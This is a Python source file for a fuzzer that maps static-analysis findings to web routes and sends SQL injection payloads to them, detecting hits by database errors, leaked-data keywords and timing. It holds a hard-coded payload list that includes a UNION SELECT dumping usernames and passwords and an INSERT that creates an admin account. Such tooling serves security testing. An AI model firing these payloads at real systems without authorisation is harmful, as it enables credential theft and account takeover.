import argparse
import ast
import hashlib
import json
import logging
import os
import re
import time
from dataclasses import dataclass, field, asdict
from typing import List, Optional, Dict, Tuple

import requests

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

# ============================================================================
# DATA MODELS
# ============================================================================

@dataclass
class NormalizedFinding:
    finding_id: str
    file_path: str
    line_number: int
    rule_id: str
    vuln_type: str
    severity: str
    snippet: str
    source_context: str = ""
    raw_data: Dict = field(default_factory=dict)

@dataclass
class TargetEndpoint:
    endpoint: str
    method: str
    param: str
    location: str  # e.g., "query", "body", "form"
    resolved: bool = True
    unresolved_reason: str = ""

@dataclass
class BaselineProfile:
    status_code: int
    response_time: float
    body_hash: str
    content_length: int

# UPDATE 1: Clean up the Data Models
@dataclass
class FuzzHit:
    finding_id: str
    endpoint: str
    method: str
    param: str
    payload: str
    status_code: int
    response_snippet: str
    anomaly_type: str
    evidence_strength: str  
    baseline_time: float
    fuzz_time: float
    request_artifact: Dict = field(default_factory=dict)
    # Removed 'confirmed' and 'reproducible'

@dataclass
class FuzzResult:
    finding_id: str
    target: TargetEndpoint
    hits: List[FuzzHit] = field(default_factory=list)
    payloads_tried: int = 0
    error_state: str = ""
    # Removed the @property def vulnerable(self) block

    @property
    def vulnerable(self) -> bool:
        return len(self.hits) > 0

    @property
    def best_payload(self) -> Optional[str]:
        if self.hits:
            return self.hits[0].payload
        return None

# ============================================================================
# PAYLOAD REGISTRY & INTELLIGENT SELECTION UPDATED
# ============================================================================

class PayloadRegistry:
    """Scalable, file-backed payload engine using generator functions."""
    
    DB_ERROR_SIGNATURES = [
        "sqlite3.operationalerror", "operational error", "syntax error",
        "unrecognized token", "no such column", "near \"or\":",
        "near \"union\":", "sqlite", "you have an error in your sql syntax",
        "pg_exception",
    ]

    DATA_LEAK_SIGNATURES = [
        "password", "secret123", "qwerty", "letmein", "admin", "alice", "bob", "charlie"
    ]

    def __init__(self, rules_file: str = "payload_rules.json"):
        self.rules_file = rules_file
        self.rule_map = self._load_rules()

    def _load_rules(self) -> Dict[str, List[str]]:
        """Loads the mapping of SAST rules to payload files."""
        if not os.path.exists(self.rules_file):
            logging.warning(f"Rule file {self.rules_file} missing. Fuzzer will fail if no payloads exist.")
            return {}
            
        with open(self.rules_file, 'r') as f:
            data = json.load(f)
            return data.get("rules", {})

    def get_payloads_for_finding(self, rule_id: str):
        """
        Generator yielding payloads one by one to keep memory footprint near zero.
        """
        # 1. Match the exact rule, or fallback to DEFAULT mapping
        file_paths = self.rule_map.get(rule_id, self.rule_map.get("DEFAULT", []))
        
        # 2. Open each mapped file and stream the payloads
        for file_path in file_paths:
            if not os.path.exists(file_path):
                logging.error(f"Payload file missing: {file_path}")
                continue
                
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    payload = line.strip()
                    if payload and not payload.startswith("#"): # Ignore blank lines and comments
                        yield payload

# ============================================================================
# TARGET RESOLVER (STATIC ANALYSIS)
# ============================================================================

class TargetResolver:
    """Analyzes Python source code to map SAST findings to runtime routes."""
    
    def __init__(self, base_dir: str):
        self.base_dir = base_dir
        self.valid_decorators = {"route", "get", "post", "put", "delete", "patch"}

    def resolve(self, finding: NormalizedFinding) -> TargetEndpoint:
        full_path = os.path.join(self.base_dir, finding.file_path)
        if not os.path.exists(full_path):
            return TargetEndpoint("", "", "", "", False, "File not found")

        try:
            with open(full_path, "r", encoding="utf-8") as f:
                source_code = f.read()
            tree = ast.parse(source_code)
        except Exception as e:
            return TargetEndpoint("", "", "", "", False, f"AST Parse Error: {e}")

        route = self._find_route_for_line(tree, finding.line_number)
        if not route:
            return TargetEndpoint("", "", "", "", False, "No route decorator found for line")

        param, location, method = self._extract_param_context(finding.snippet)
        if not method:
            method = "GET" if location == "query" else "POST"

        return TargetEndpoint(route, method, param, location)

    def _find_route_for_line(self, tree: ast.AST, target_line: int) -> Optional[str]:
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                if hasattr(node, "lineno") and node.lineno <= target_line <= getattr(node, "end_lineno", float('inf')):
                    for dec in node.decorator_list:
                        if isinstance(dec, ast.Call):
                            attr_name = getattr(dec.func, "attr", "")
                            if attr_name in self.valid_decorators:
                                if dec.args and isinstance(dec.args[0], ast.Constant):
                                    return dec.args[0].value
        return None

    def _extract_param_context(self, snippet: str) -> Tuple[str, str, str]:
        if "request.args" in snippet:
            match = re.search(r"request\.args\.get\(['\"](\w+)['\"]", snippet)
            param = match.group(1) if match else "id"
            return param, "query", "GET"
        elif "request.form" in snippet:
            match = re.search(r"request\.form(?:\[|\.get\()['\"](\w+)['\"]", snippet)
            param = match.group(1) if match else "username"
            return param, "form", "POST"
        elif "request.get_json" in snippet:
            match = re.search(r"get_json\(\)(?:\[|\.get\()['\"](\w+)['\"]", snippet)
            param = match.group(1) if match else "password"
            return param, "json", "POST"
            
        # Removed the f-string variable guesser. Just fallback safely to "id"
        return "id", "query", "GET"

# ============================================================================
# CORE FUZZER
# ============================================================================

class SASTDrivenFuzzer:
    def __init__(self, base_url: str, timeout: float = 5.0, time_threshold: float = 1.5):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.registry = PayloadRegistry()
        
        # Performance: Connection pooling and Baseline caching
        self.session = requests.Session()
        self.baseline_cache: Dict[tuple, BaselineProfile] = {}

    def _hash_response(self, text: str) -> str:
        return hashlib.md5(text.encode('utf-8')).hexdigest()

    def _get_baseline(self, url: str, method: str, param: str, location: str, bypass_cache: bool = False) -> BaselineProfile:
        cache_key = (url, method, param, location)
        if not bypass_cache and cache_key in self.baseline_cache:
            return self.baseline_cache[cache_key]

        safe_value = "1"
        kwargs = {"timeout": self.timeout}
        if location == "query":
            kwargs["params"] = {param: safe_value}
        elif location == "json":
            kwargs["json"] = {param: safe_value}
        else:
            kwargs["data"] = {param: safe_value}

        t0 = time.perf_counter()
        try:
            resp = self.session.request(method, url, **kwargs)
            duration = time.perf_counter() - t0
            profile = BaselineProfile(resp.status_code, duration, self._hash_response(resp.text), len(resp.text))
        except requests.RequestException:
            profile = BaselineProfile(0, self.timeout, "", 0)

        if not bypass_cache:
            self.baseline_cache[cache_key] = profile
        return profile

    def _detect_anomaly(self, resp: requests.Response, baseline: BaselineProfile, fuzz_time: float) -> Tuple[Optional[str], str]:
        body = resp.text.lower()
        
        for sig in self.registry.DATA_LEAK_SIGNATURES:
            if sig in body: return "DATA_LEAK", "Very Strong"
        
        for sig in self.registry.DB_ERROR_SIGNATURES:
            if sig in body: return "DB_ERROR", "Strong"

        if fuzz_time - baseline.response_time > self.time_threshold:
            return "TIME_ANOMALY", "Medium"

        if resp.status_code == 500 and baseline.status_code != 500:
            return "STATUS_500", "Weak"
            
        if self._hash_response(resp.text) != baseline.body_hash and abs(len(resp.text) - baseline.content_length) > 50:
            return "BEHAVIOR_CHANGE", "Weak"

        return None, "None"

    def _verify_anomaly(self, url: str, method: str, kwargs: dict, baseline: BaselineProfile) -> bool:
        """Control request bypassing cache to detect global server instability."""
        try:
            param_name, location = "id", "query"
            if "params" in kwargs: param_name = list(kwargs["params"].keys())[0]
            elif "json" in kwargs: param_name, location = list(kwargs["json"].keys())[0], "json"
            elif "data" in kwargs: param_name, location = list(kwargs["data"].keys())[0], "form"

            ctrl_baseline = self._get_baseline(url, method, param_name, location, bypass_cache=True)
            if ctrl_baseline.status_code == 500: 
                return False  # Server is globally unstable
                
            resp = self.session.request(method, url, **kwargs)
            anomaly, _ = self._detect_anomaly(resp, baseline, 0)
            return anomaly is not None
        except Exception:
            return False

        # UPDATE 2: Modify fuzz_target in SASTDrivenFuzzer
    def fuzz_target(self, finding: NormalizedFinding, target: TargetEndpoint) -> FuzzResult:
        result = FuzzResult(finding.finding_id, target)
        if not target.resolved:
            result.error_state = f"TARGET_UNRESOLVED: {target.unresolved_reason}"
            return result

        url = self.base_url + target.endpoint
        baseline = self._get_baseline(url, target.method, target.param, target.location)

        if baseline.status_code == 404:
            result.error_state = "DEAD_ENDPOINT: Route returned 404 Not Found"
            return result

        payloads = self.registry.get_payloads_for_finding(finding.rule_id)

        for payload in payloads:
            result.payloads_tried += 1
            kwargs = {"timeout": self.timeout}

            if target.location == "query": kwargs["params"] = {target.param: payload}
            elif target.location == "json": kwargs["json"] = {target.param: payload}
            else: kwargs["data"] = {target.param: payload}

            try:
                t0 = time.perf_counter()
                resp = self.session.request(target.method, url, **kwargs)
                fuzz_time = time.perf_counter() - t0
            except requests.Timeout:
                resp = type("R", (), {"status_code": 0, "text": "", "headers": {}})()
                fuzz_time = self.timeout
            except requests.RequestException:
                continue

            anomaly, strength = self._detect_anomaly(resp, baseline, fuzz_time)

            # Record EVERYTHING that causes an anomaly, without confirming or breaking
            if anomaly:
                hit = FuzzHit(
                    finding_id=finding.finding_id,
                    endpoint=url, method=target.method, param=target.param,
                    payload=payload, status_code=resp.status_code,
                    response_snippet=resp.text.replace("\n", " ").strip()[:200],
                    anomaly_type=anomaly, evidence_strength=strength,
                    baseline_time=baseline.response_time, fuzz_time=fuzz_time,
                    request_artifact={"url": url, "method": target.method, "kwargs": kwargs}
                )
                result.hits.append(hit)

                # Removed: reproducibility check and the `if hit.confirmed: break` statement
                # Now it will gather data for every anomalous payload it finds.

        return result 
    

# ============================================================================
# PARSERS & OUTPUT (COMPATIBILITY BOUNDARY)
# ============================================================================

def parse_sast_json(filepath: str) -> List[NormalizedFinding]:
    with open(filepath, 'r') as f:
        data = json.load(f)
    findings = []
    
    issue_list = data if isinstance(data, list) else data.get("issues", [])
    
    for issue in issue_list:
        findings.append(NormalizedFinding(
            finding_id=issue.get("rule_id", "rule_unknown"),
            file_path=issue.get("file", ""),
            line_number=issue.get("line", 0),
            rule_id=issue.get("rule_id", ""),
            vuln_type=issue.get("type", "SQL_INJECTION"),
            severity=issue.get("severity", "High"),
            snippet=issue.get("snippet", ""),
            raw_data=issue
        ))
    return findings
SQLI_PAYLOADS = [
    "1 OR 1=1--",
    "' UNION SELECT 1,username,password FROM users--",
    "admin'--",
    "'; INSERT INTO users (username,password,role) VALUES ('pwned','x','admin')--",
    "' OR 'a'='a",
    "1 OR 'unusual'='unusual'",
]

@dataclass
class LegacyFuzzHit:
    endpoint: str
    method: str
    param: str
    payload: str
    status_code: int
    response_snippet: str
    anomaly_type: str
    baseline_time: float
    fuzz_time: float
    confirmed: bool = False

@dataclass
class LegacyFuzzResult:
    endpoint: str
    hits: List[LegacyFuzzHit] = field(default_factory=list)
    payloads_tried: int = 0

    @property
    def vulnerable(self) -> bool:
        return len(self.hits) > 0

    @property
    def best_payload(self) -> Optional[str]:
        if self.hits:
            return self.hits[0].payload
        return None

class SQLiFuzzer:
    def __init__(self, base_url: str, timeout: float = 5.0, time_threshold: float = 1.5):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.time_threshold = time_threshold

    def _detect_anomaly(
        self,
        response: requests.Response,
        baseline_time: float,
        fuzz_time: float,
    ) -> Optional[str]:
        body = response.text.lower()
        if response.status_code == 500:
            return "STATUS_500"
        for sig in PayloadRegistry.DB_ERROR_SIGNATURES:
            if sig in body:
                return "DB_ERROR"
        for sig in PayloadRegistry.DATA_LEAK_SIGNATURES:
            if sig in body:
                return "DATA_LEAK"
        if fuzz_time - baseline_time > self.time_threshold:
            return "TIME_ANOMALY"
        return None

    def _get_baseline(self, url: str, method: str, param: str, safe_value: str) -> float:
        try:
            t0 = time.perf_counter()
            if method == "GET":
                requests.get(url, params={param: safe_value}, timeout=self.timeout)
            else:
                requests.post(url, json={param: safe_value}, timeout=self.timeout)
            return time.perf_counter() - t0
        except Exception:
            return 0.1

    def _snippet(self, text: str, max_len: int = 200) -> str:
        text = text.replace("\n", " ").strip()
        return text[:max_len] + ("…" if len(text) > max_len else "")

    def fuzz_get(self, path: str, param: str, safe_value: str = "1") -> LegacyFuzzResult:
        url = self.base_url + path
        result = LegacyFuzzResult(endpoint=f"GET {path}?{param}=")
        baseline_time = self._get_baseline(url, "GET", param, safe_value)

        for payload in SQLI_PAYLOADS:
            result.payloads_tried += 1
            try:
                t0 = time.perf_counter()
                resp = requests.get(url, params={param: payload}, timeout=self.timeout)
                fuzz_time = time.perf_counter() - t0
            except requests.Timeout:
                fuzz_time = self.timeout
                resp = type("R", (), {"status_code": 0, "text": ""})()

            anomaly = self._detect_anomaly(resp, baseline_time, fuzz_time)
            if anomaly:
                result.hits.append(LegacyFuzzHit(
                    endpoint=f"GET {path}",
                    method="GET",
                    param=param,
                    payload=payload,
                    status_code=resp.status_code,
                    response_snippet=self._snippet(resp.text),
                    anomaly_type=anomaly,
                    baseline_time=baseline_time,
                    fuzz_time=fuzz_time,
                    confirmed=True,
                ))
                break

        return result

    def fuzz_post_json(self, path: str, param: str, extra_fields: dict = None) -> LegacyFuzzResult:
        url = self.base_url + path
        result = LegacyFuzzResult(endpoint=f"POST {path} [{param}]")
        baseline_time = self._get_baseline(url, "POST", param, "safe_value")
        extra = extra_fields or {}

        for payload in SQLI_PAYLOADS:
            result.payloads_tried += 1
            body = {param: payload, **extra}
            try:
                t0 = time.perf_counter()
                resp = requests.post(url, json=body, timeout=self.timeout)
                fuzz_time = time.perf_counter() - t0
            except requests.Timeout:
                fuzz_time = self.timeout
                resp = type("R", (), {"status_code": 0, "text": ""})()

            anomaly = self._detect_anomaly(resp, baseline_time, fuzz_time)
            if anomaly:
                result.hits.append(LegacyFuzzHit(
                    endpoint=f"POST {path}",
                    method="POST",
                    param=param,
                    payload=payload,
                    status_code=resp.status_code,
                    response_snippet=self._snippet(resp.text),
                    anomaly_type=anomaly,
                    baseline_time=baseline_time,
                    fuzz_time=fuzz_time,
                    confirmed=True,
                ))
                break

        return result

    def fuzz_all(self) -> List[LegacyFuzzResult]:
        results = []
        results.append(self.fuzz_get("/api/user", "id", safe_value="1"))
        results.append(self.fuzz_get("/api/search", "q", safe_value="alice"))
        results.append(self.fuzz_post_json(
            "/api/login", "username",
            extra_fields={"password": "anything"},
        ))
        results.append(self.fuzz_post_json(
            "/api/login", "password",
            extra_fields={"username": "alice"},
        ))
        return results

def format_legacy_results(results: List[LegacyFuzzResult]) -> str:
    lines = []
    for r in results:
        status = "🔴 VULNERABLE" if r.vulnerable else "🟢 clean"
        lines.append(f"  {status}  {r.endpoint}  ({r.payloads_tried} payloads tried)")
        for h in r.hits:
            lines.append(f"    payload  : {h.payload!r}")
            lines.append(f"    anomaly  : {h.anomaly_type}")
            lines.append(f"    response : {h.response_snippet}")
    return "\n".join(lines)

def format_results(results: list) -> str:
    """Maintains exact compatibility with existing output expectations."""
    if not results:
        return ""
    if hasattr(results[0], 'endpoint') and isinstance(results[0].endpoint, str) and not hasattr(results[0], 'target'):
        return format_legacy_results(results)

    lines = []
    for r in results:
        if r.error_state:
            lines.append(f"  🟡 UNRESOLVED  {r.finding_id} : {r.error_state}")
            continue
            
        status = "🔴 VULNERABLE" if r.vulnerable else "🟢 clean"
        endpoint_str = f"{r.target.method} {r.target.endpoint}?{r.target.param}="
        lines.append(f"  {status}  {endpoint_str}  ({r.payloads_tried} payloads tried)")
        
        for h in r.hits:
            lines.append(f"    finding  : {getattr(h, 'finding_id', '')}")
            lines.append(f"    payload  : {h.payload!r}")
            lines.append(f"    anomaly  : {h.anomaly_type} (Strength: {getattr(h, 'evidence_strength', 'Strong')})")
            lines.append(f"    response : {h.response_snippet}")
    return "\n".join(lines)

def run_pipeline(base_url: str, sast_file: str, base_dir: str, out_format: str):
    findings = parse_sast_json(sast_file)
    resolver = TargetResolver(base_dir)
    fuzzer = SASTDrivenFuzzer(base_url)
    
    results = []
    for finding in findings:
        target = resolver.resolve(finding)
        result = fuzzer.fuzz_target(finding, target)
        results.append(result)

    if out_format == "json":
        print(json.dumps([asdict(r) for r in results], indent=2))
    else:
        vulnerable_count = sum(1 for r in results if r.vulnerable)
        print(f"\nFuzz complete — {vulnerable_count}/{len(results)} endpoints vulnerable\n")
        print(format_results(results))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SAST-Driven Autonomous Fuzzer")
    parser.add_argument("--base-url", required=True, help="Base URL of the target")
    parser.add_argument("--sast-json", required=True, help="Path to SAST JSON output")
    parser.add_argument("--src-dir", default=".", help="Base directory of source code for resolution")
    parser.add_argument("--format", choices=["text", "json"], default="text", help="Output format")
    args = parser.parse_args()
    run_pipeline(args.base_url, args.sast_json, args.src_dir, args.format)